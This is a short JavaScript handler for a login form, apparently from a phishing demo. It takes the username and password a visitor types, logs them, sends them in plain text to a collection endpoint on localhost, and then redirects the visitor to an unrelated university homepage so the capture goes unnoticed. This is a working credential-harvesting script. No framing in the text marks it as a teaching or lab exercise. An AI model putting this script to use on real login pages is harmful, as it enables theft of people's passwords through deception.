document.getElementById('login-form').addEventListener('submit', function(event) {
  event.preventDefault();
  const url = 'http://localhost:5000/api/text';

  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  let data = `Username: ${username}, Password: ${password}`;
  console.log(data);

  fetch(url, {
    method: 'POST',
    body: data
  })
    .then(response => {
      if (response.ok) {
        window.location.replace("https://web.eecs.utk.edu/~hbrand/homepage/");
      } else {
        throw new Error('Failed');
      }
    })
    .catch(error => console.error(error));
});
